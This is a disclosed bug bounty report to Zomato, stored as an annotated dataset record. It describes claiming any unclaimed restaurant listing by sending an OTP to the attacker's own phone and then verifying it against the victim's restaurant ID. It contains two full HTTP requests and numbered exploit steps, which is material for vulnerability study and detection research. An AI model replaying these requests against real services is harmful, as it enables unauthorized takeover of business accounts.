{
  "reported_to": "Zomato",
  "reported_by": "ashoka_rao ",
  "title": "Claiming the listing of a non-delivery restaurant through OTP manipulation",
  "content": "\nSummary: Am able to claim any restaurant which is not claimed before.\nDescription: An endpoint POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2 sends OTP to the restaurant mobile no.\nRequest (Request:1) is -\nCode 767 Bytes\n1POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2\n2Host: www.zomato.com\n3Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n4Content-Length: 58\n5Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"\n6Accept: application/json, text/plain, */*\n7X-Zomato-Csrft: XXXXXXXXXXXXXXXXXXXXXXX\n8Sec-Ch-Ua-Mobile: ?0\n9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\n10Content-Type: application/json;charset=UTF-8\n11Origin: https://www.zomato.com\n12Sec-Fetch-Site: same-origin\n13Sec-Fetch-Mode: cors\n14Sec-Fetch-Dest: empty\n15Referer: https://www.zomato.com/partner_with_us/ownership\n16Accept-Encoding: gzip, deflate\n17Accept-Language: en-US,en;q=0.9\n18Connection: close\n19\n20{\"number\":\"XXXXXXXXXX\",\"isdCode\":\"+91\",\"resId\":\"XXXXXXXXXX\"}\nwhich responses -\nCode 70 Bytes\n1{\"status\":\"success\",\"message\":\"OTP SENT\",\"requestId\":XXXXXXX,\"code\":2}\nHere Attacker gains OTP on his own mobile no by changing the number & resId to his own restaurant.\nBy using the following request (Request:2) attacker is able to map his e-mail Id as Owner / Manager to Victim restaurant.\n##Request:2\nCode 760 Bytes\n1POST /restaurant-onboard-diy/v2/verify-auto-claim-otp HTTP/2\n2Host: www.zomato.com\n3Cookie: XXXXXXXXXXXXXXXX\n4Content-Length: 68\n5Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"\n6Accept: application/json, text/plain, */*\n7X-Zomato-Csrft: XXXXXXXXXXXXXXXXXXXXX\n8Sec-Ch-Ua-Mobile: ?0\n9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\n10Content-Type: application/json;charset=UTF-8\n11Origin: https://www.zomato.com\n12Sec-Fetch-Site: same-origin\n13Sec-Fetch-Mode: cors\n14Sec-Fetch-Dest: empty\n15Referer: https://www.zomato.com/partner_with_us/ownership\n16Accept-Encoding: gzip, deflate\n17Accept-Language: en-US,en;q=0.9\n18Connection: close\n19\n20{\"verificationCode\":XXX,\"requestId\":\"XXXXXXXX\",\"resId\":\"XXXXXXXXX\"}\nHere by changing the verificationCode - (Otp received on Attacker Mobile in response of Request :1 )& requestId (Response of request:1) and resId to Victim Restaurant. Request:2 maps e-mail id of Attacker to Victim restaurant.\nPrerequisite - Attacker should have a restaurant page, mapped Mobile No With Email Id.\nNote : - If any restaurant is not mapped owner / manager then claimed restaurant can be claimed\nImpact\nClaim a restaurant.\n\n",
  "severity": [
    9.1,
    null
  ],
  "bounty": 3250,
  "weaknesses": [
    "Improper Authorization"
  ],
  "screenshots": {},
  "disclosed_date": 1645537860,
  "report_url": "https://hackerone.com/reports/1330529",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Send a POST request to `/restaurant-onboard-diy/v2/send-auto-claim-otp` with the attacker's mobile number and the victim's restaurant ID (`resId`)."
    ],
    [
      2,
      "Use the OTP received on the attacker's mobile to send a POST request to `/restaurant-onboard-diy/v2/verify-auto-claim-otp` with the OTP, `requestId` from the first response, and the victim's `resId` to claim ownership."
    ]
  ],
  "vuln_description": "An attacker can claim ownership of an unclaimed restaurant by manipulating the OTP verification process. By sending an OTP to their own mobile number while specifying the victim's restaurant ID, they can bypass the intended verification flow and associate their email as the owner/manager of the victim's restaurant.",
  "reason": "The attack involves manipulating the OTP verification flow in a non-obvious way, requiring the attacker to understand the endpoint interactions and the lack of validation on the restaurant ID during the OTP process. However, the steps are relatively straightforward once the endpoints are identified.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": true,
  "authnz_byppass_detectable": true,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reasoning": "The vulnerability involves manipulating resource IDs (resId) and phone numbers in OTP-related endpoints to claim unauthorized ownership. This matches the IDOR detection pattern where (user_session, action, resource_id) tuples are analyzed. The attacker uses their own session but substitutes a victim's restaurant ID (resId) and phone number, bypassing authorization checks. The methodology's step 4e (substituting resource_ids of the same type) would detect this, as the backend fails to validate ownership rights during OTP verification.",
    "is_simple_authnz": true
  }
}